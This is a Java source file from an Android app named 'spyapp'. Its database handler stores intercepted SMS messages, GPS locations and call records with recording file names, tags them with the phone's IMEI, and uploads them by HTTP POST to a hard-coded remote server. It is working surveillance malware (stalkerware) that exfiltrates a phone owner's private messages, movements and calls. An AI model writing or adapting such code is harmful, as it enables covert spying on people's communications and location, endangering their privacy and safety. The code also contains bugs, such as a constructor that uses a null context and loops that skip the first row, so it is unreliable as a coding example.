package com.example.spyapp;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.telephony.TelephonyManager;
import android.util.Log;

public class DatabaseHandler {
	public static final String DB_NAME="goodb.db";
	public static final String MSG_TABLE_NAME="SMSDB";
	public static final String LOCATION_TABLE_NAME="LOCDB";
	public static final String CALL_TABLE_NAME="CALLDB";

	//Coloums for the SMS Database
	public static final String C_TIMESTAMP="TIMESTAMP";
	public static final String C_SENDER="SENDER";
	public static final String C_RECEIVER="RECEIVER";
	public static final String C_BODY="BODY";
	public static final String C_TYPE="TYPE";
	public static final String C_UPLOADED="UPLOADED";
	//Coloums for the Location Database
	public static final String L_TIMESTAMP="TIMESTAMP";
	public static final String L_LATITUDE="LATITUDE";
	public static final String L_LONGITUDE="LONGITUDE";
	public static final String L_UPLOADED="UPLOADED";
	
	public static final String D_TIMESTAMP="TIMESTAMP";
	public static final String D_TYPE="TYPE";
	public static final String D_DURATION="DURATION";
	public static final String D_TO_FROM="TOFROM";
	public static final String D_FILE="FILENAME";
	public static final String D_UPLOADED="UPLOADED";
	
	public String[][] dbentries = new String[1000][150];
	
	public static final int DB_VERSION=1334;
	private static String DB_PATH = ""; 

	static final String TAG="DatabaseHandler";
	public static String IMEI=null;
	

	Context context;
	dbHelper dbhelper;
   
	
	public DatabaseHandler()
	{
	//	this.context=context;
	       DB_PATH = context.getApplicationInfo().dataDir + "/databases/";         
          //Log.d(TAG,DB_PATH);
		dbhelper= new dbHelper();
		//Log.d(TAG,"dbhelper= new dbHelper();");
	
	}
	public DatabaseHandler(Context context)
	{ 
		//Code to fetch the IMEI. This will be used in later functions.
	    TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE); 
		IMEI= tm.getDeviceId();
		this.context=context;
	       DB_PATH = context.getApplicationInfo().dataDir + "/databases/";         
          //Log.d(TAG,DB_PATH);
		dbhelper= new dbHelper();
		//Log.d(TAG,"dbhelper= new dbHelper();");
	
	}
	
	public void insertmsgintodb(long TIMESTAMP, String SENDER , String RECEIVER
			, String BODY,int TYPE,int UPLOADED)
	{
		SQLiteDatabase sqldb;
		sqldb=dbhelper.getWritableDatabase();
		
		ContentValues values=new ContentValues();
		values.put(C_TIMESTAMP,TIMESTAMP);
		values.put(C_SENDER,SENDER);
		values.put(C_RECEIVER,RECEIVER);
		values.put(C_BODY,BODY);
		values.put(C_TYPE,TYPE);
		values.put(C_UPLOADED,UPLOADED);
		 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
		 Log.d(TAG,"SENDER:"+SENDER);
         Log.d(TAG,"RECEIVER:"+RECEIVER);
         Log.d(TAG,"BODY:"+BODY);
         Log.d(TAG,"TYPE:"+Integer.toString(TYPE));
         Log.d(TAG,"UPLOADED:"+Integer.toString(UPLOADED));
		sqldb.insert(MSG_TABLE_NAME,null,values);
		sqldb.close();
	}
	

	public void insertlocintodb(long TIMESTAMP, double LATITUDE , double LONGITUDE,int UPLOADED)
	{
		SQLiteDatabase sqldb;
		sqldb=dbhelper.getWritableDatabase();
		
		ContentValues values=new ContentValues();
		values.put(L_TIMESTAMP,TIMESTAMP);
		values.put(L_LATITUDE,LATITUDE);
		values.put(L_LONGITUDE,LONGITUDE);
		values.put(L_UPLOADED, UPLOADED);
      	 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
		 Log.d(TAG,"LATITUDE:"+Double.toString(LATITUDE));
         Log.d(TAG,"LONGITUDE:"+Double.toString(LONGITUDE));
         Log.d(TAG,"UPLOADED:"+Integer.toString(UPLOADED));
            
		sqldb.insert(LOCATION_TABLE_NAME,null,values);
		sqldb.close();
	}
	
	public void insertcallintodb(long TIMESTAMP, int TYPE, Long DURATION,String TO_FROM, String FILENAME,int UPLOADED)
	{
		SQLiteDatabase sqldb;
		sqldb=dbhelper.getWritableDatabase();
		
		ContentValues values=new ContentValues();
		values.put(D_TIMESTAMP,TIMESTAMP);
		values.put(D_TYPE,TYPE);
		values.put(D_DURATION,DURATION);
		values.put(D_TO_FROM,TO_FROM);
		values.put(D_FILE,FILENAME);
		values.put(D_UPLOADED,UPLOADED);
		 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
		 Log.d(TAG,"TYPE:"+Integer.toString(TYPE));
         Log.d(TAG,"DURATION:"+Double.toString(DURATION));
         Log.d(TAG,"TO_FROM:"+TO_FROM);
         Log.d(TAG,"FILENAME:"+FILENAME);
         Log.d(TAG,"UPLOADED:"+UPLOADED);
		sqldb.insert(CALL_TABLE_NAME,null,values);
		sqldb.close();
	}
	
	public boolean checkTimestampUnique(long timestamp_to_compare) {
        
		SQLiteDatabase sqldb;
        // Select All Quer
		sqldb=dbhelper.getWritableDatabase();
		String selectQuery = "SELECT * FROM " + MSG_TABLE_NAME;
		
   //     SQLiteDatabase db = this.getWritableDatabase();
        Cursor cursor1 = sqldb.rawQuery(selectQuery, null);
        
        //getting the number of rows in the table
       Cursor mCount= sqldb.rawQuery("select * from " + MSG_TABLE_NAME, null);
        mCount.moveToFirst();
        cursor1.moveToFirst();
      //  int rowcount= mCount.getCount();
     //   //Log.d(TAG,"rowcount"+Integer.toString(rowcount));
       
      
        // looping through all rows and adding to list
        if (cursor1 != null && cursor1.moveToFirst()) {
        	do
        	{        		
        	  if (timestamp_to_compare==cursor1.getLong(0))
        	  {
        		//  Log.d(TAG,"TIMESTAMP BEING COMPARED AGAINST:"+
        		//		  Long.toString(cursor1.getLong(0)));
        	//	  Log.d(TAG,"TIMESTAMP"+Long.toString(timestamp_to_compare)+" Not Unique");
        		  return false;
        		  
        	  }  
              	
        	}while(cursor1.moveToNext());
          
        }		
        mCount.close();
        cursor1.close();
        sqldb.close();
        return true;
 
    }
	
	void uploadSMS()
	{
		SQLiteDatabase sqldb;
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://192.168.1.146:83/submit_sms.php");
		int rowcount=0;
		int responsecode=0;
        sqldb=dbhelper.getWritableDatabase();
        String selectQuery = "SELECT  * FROM " + MSG_TABLE_NAME; 
        Cursor cursor = sqldb.rawQuery(selectQuery, null);
        cursor.moveToFirst();
       // Log.d(TAG,"Cursor count:"+Integer.toString(cursor.getCount()));
        while(cursor.moveToNext())
        {
        	Log.d(TAG,"UPLOADED STATUS:"+Integer.toString(cursor.getInt(5)));
        	if (cursor.getInt(cursor.getColumnIndex(C_UPLOADED)) == 0)
        	{
        		
        		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                nameValuePairs.add(new BasicNameValuePair("IMEI", IMEI));
                nameValuePairs.add(new BasicNameValuePair("TIMESTAMP", cursor.getString(0)));
                nameValuePairs.add(new BasicNameValuePair("SENDER", cursor.getString(1)));
                nameValuePairs.add(new BasicNameValuePair("RECEIVER", cursor.getString(2)));
                nameValuePairs.add(new BasicNameValuePair("BODY", cursor.getString(3)));
                nameValuePairs.add(new BasicNameValuePair("TYPE", cursor.getString(4)));
                
                try {
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

                // Execute HTTP Post Request
                try {
					HttpResponse response = httpclient.execute(httppost);
					responsecode = response.getStatusLine().getStatusCode();
					Log.d(TAG,"responsecode:"+Integer.toString(responsecode));
			         if (responsecode==200)
		                {//If the message has been successfully updated
			        	  Log.d(TAG,"TITS");
			        	   
		                	ContentValues cv = new ContentValues();
		                	cv.put("UPLOADED",1);
		                	SQLiteDatabase db1 = dbhelper.getWritableDatabase();
		                	db1.update(MSG_TABLE_NAME, cv, "TIMESTAMP="+cursor.getString(0), null);
		                	db1.close();
			        	  
			        	  
			        	  
			        		/*String updatequery = "UPDATE "+MSG_TABLE_NAME+" SET UPLOADED=1 WHERE TIMESTAMP="+cursor.getString(0)+";";
			        		
			        		Cursor cursor2 = db2.rawQuery(updatequery, null);
			        		Log.d(TAG,"Count:"+cursor2.getCount());
			        		cursor2.close();
			        		db2.close();*/
		                }
					response.getEntity().consumeContent();
				} catch (ClientProtocolException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
                
       
        	}
        }
        cursor.close();
        sqldb.close();
       
	}
	
	void uploadGPS()
	{
		SQLiteDatabase sqldb;
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://192.168.1.146:83/submit_gps.php");
		int responsecode=0;
        sqldb=dbhelper.getWritableDatabase();
        String selectQuery = "SELECT  * FROM " + LOCATION_TABLE_NAME; 
        Cursor cursor = sqldb.rawQuery(selectQuery, null);
        cursor.moveToFirst();
       // Log.d(TAG,"Cursor count:"+Integer.toString(cursor.getCount()));
        while(cursor.moveToNext())
        {
        	Log.d(TAG,"UPLOADED STATUS:"+Integer.toString(cursor.getInt(3)));
        	if (cursor.getInt(3) == 0)
        	{
        		
        		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                nameValuePairs.add(new BasicNameValuePair("IMEI", IMEI));
                nameValuePairs.add(new BasicNameValuePair("TIMESTAMP", cursor.getString(0)));
                nameValuePairs.add(new BasicNameValuePair("LATITUDE", cursor.getString(1)));
                nameValuePairs.add(new BasicNameValuePair("LONGITUDE", cursor.getString(2)));
                             
                try {
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

                // Execute HTTP Post Request
                try {
					HttpResponse response = httpclient.execute(httppost);
					responsecode = response.getStatusLine().getStatusCode();
					Log.d(TAG,"responsecode:"+Integer.toString(responsecode));
					 if (responsecode==200)
		                {//If the message has been successfully updated
		                	Log.d(TAG,"TITS");
		                	
		                	ContentValues cv = new ContentValues();
		                	cv.put("UPLOADED",1);
			        		SQLiteDatabase db2 = dbhelper.getWritableDatabase();
		                	db2.update(LOCATION_TABLE_NAME,cv,"TIMESTAMP="+cursor.getString(0), null);
		                	db2.close();
		             /*   	
			        		String updatequery = "UPDATE "+LOCATION_TABLE_NAME+" SET UPLOADED=1 WHERE TIMESTAMP="+cursor.getString(0)+";";
			        		Cursor cursor2 = db2.rawQuery(updatequery, null);
			        		Log.d(TAG,"Count:"+cursor2.getCount());
			        		cursor2.close();
			        		db2.close(); */
		                }
					response.getEntity().consumeContent();
				} catch (ClientProtocolException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
                
               
        	}
        }
        cursor.close();
        sqldb.close();
	}
	
	void uploadCall()
	{
		SQLiteDatabase sqldb;
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://192.168.1.146:83/submit_call.php");
		int responsecode=0;
        sqldb=dbhelper.getWritableDatabase();
        String selectQuery = "SELECT  * FROM " + CALL_TABLE_NAME; 
        Cursor cursor = sqldb.rawQuery(selectQuery, null);
        cursor.moveToFirst();
       // Log.d(TAG,"Cursor count:"+Integer.toString(cursor.getCount()));
        while(cursor.moveToNext())
        {
        	Log.d(TAG,"UPLOADED STATUS:"+Integer.toString(cursor.getInt(5)));
        	if (cursor.getInt(5) == 0)
        	{
        		
        		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                nameValuePairs.add(new BasicNameValuePair("IMEI", IMEI));
                nameValuePairs.add(new BasicNameValuePair("TIMESTAMP", cursor.getString(0)));
                nameValuePairs.add(new BasicNameValuePair("TYPE", cursor.getString(1)));
                nameValuePairs.add(new BasicNameValuePair("DURATION", cursor.getString(2)));
		nameValuePairs.add(new BasicNameValuePair("TOFROM", cursor.getString(3)));
		nameValuePairs.add(new BasicNameValuePair("FILENAME", cursor.getString(4)));
                             
                try {
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

                // Execute HTTP Post Request
                try {
					HttpResponse response = httpclient.execute(httppost);
					responsecode = response.getStatusLine().getStatusCode();
					Log.d(TAG,"responsecode:"+Integer.toString(responsecode));
					 if (responsecode==200)
		                {//If the message has been successfully updated
		                			                	
		                	ContentValues cv = new ContentValues();
		                	cv.put("UPLOADED",1);
			        		SQLiteDatabase db2 = dbhelper.getWritableDatabase();
		                	db2.update(CALL_TABLE_NAME,cv,"TIMESTAMP="+cursor.getString(0), null);
		                	db2.close();
		            
		                }
					response.getEntity().consumeContent();
				} catch (ClientProtocolException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
                
               
        	}
        }
        cursor.close();
        sqldb.close();
	}

	
	
	  public String[][] getAllvalues() {
	        
		  
	        // Select All Query
	     //   int i,j=0;
	        SQLiteDatabase sqldb;
	        
	        sqldb=dbhelper.getWritableDatabase();
				
	        String selectQuery = "SELECT  * FROM " + MSG_TABLE_NAME;
	 
	   //     SQLiteDatabase db = this.getWritableDatabase();
	        Cursor cursor = sqldb.rawQuery(selectQuery, null);
	        
	        //getting the number of rows in the table
	   //     Cursor mCount= sqldb.rawQuery("select count(*) from " + MSG_TABLE_NAME, null);
	    //    mCount.moveToFirst();
	  //      int rowcount= mCount.getInt(0); 	
	       // Log.d(TAG,"rowcount:"+Integer.toString(rowcount));
	  //      mCount.close();
	      
	        // looping through all rows and adding to list
	         
	          cursor.moveToLast();
	          dbentries[0][0]=cursor.getString(0);
	          dbentries[0][1]=cursor.getString(1);
	          dbentries[0][2]=cursor.getString(2);
	          dbentries[0][3]=cursor.getString(3);
	          dbentries[0][4]=cursor.getString(4);
	    /*      
	        if (cursor != null && cursor.moveToFirst()) {
	        	for (i=0;i<5;i++)
	        	{	        		
	        	for(j=0;j<4;j++)
	        	{
	        //		String timestamp_str=Long.toString(cursor.getString(0));
	        	    dbentries[i][j]=cursor.getString(j);
	        		
	        	}
        		
	        	cursor.moveToNext();
	        	}
	        	cursor.moveToFirst();
	        
	          
	        }*/
	      	Log.d(TAG,"TIMESTAMP:"+dbentries[0][0]+"FROM"+dbentries[0][1]
    				+"TO:"+dbentries[0][2]+"MSG:"+dbentries[0][3]+"TYPE:"
    				+dbentries[0][4]);
	      	
	     	sqldb.close();
	        cursor.close();
	        return dbentries;
	 
	    }

	class dbHelper extends SQLiteOpenHelper {

		public dbHelper() {
			
			super(context, DB_NAME, null, DB_VERSION);
			//Log.d(TAG,"Constructor called");
		}

		@Override
		/* Table details
		 * 
		 * TABLE NAME : SMS
		 * TABLE COLOMNS:
		 * 1)TIMESTAMP -> Key field -> LONG
		 * 2)SENDER -> String
		 * 3)RECEIVER -> String
		 * 4)BODY -> String
		 * 5)TYPE -> Integer (1 for Inbox , 2 for Sent) 
		 * 6) UPLOADED -> Boolean 
		 * 
		 */
		public void onCreate(SQLiteDatabase db) {
			//Log.d(TAG,"OnCreate called!");
			String sql1 = String.format("create table if not exists %s" +
					" (%s long primary key,%s text,%s text,%s text,%s int,%s int)"
					,MSG_TABLE_NAME,C_TIMESTAMP,C_SENDER,C_RECEIVER,C_BODY,C_TYPE,C_UPLOADED);
			//Log.d(TAG,"onCreate with SQL: "+sql1);
			
			String sql2 = String.format("create table if not exists %s" +
					" (%s long primary key,%s double,%s double,%s int)"
					,LOCATION_TABLE_NAME,L_TIMESTAMP,L_LATITUDE,L_LONGITUDE,L_UPLOADED);
			//Log.d(TAG,"onCreate with SQL: "+sql1);
			
			String sql3 = String.format("create table if not exists %s" +
					" (%s long primary key,%s int,%s long,%s text,%s text,%s int)"
					,CALL_TABLE_NAME,D_TIMESTAMP,D_TYPE,D_DURATION,D_TO_FROM,D_FILE,D_UPLOADED);
			
			db.execSQL(sql1);
			db.execSQL(sql2);
			db.execSQL(sql3);
			
		}

		
	  
		@Override
		public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
			
		}
		
	}

}

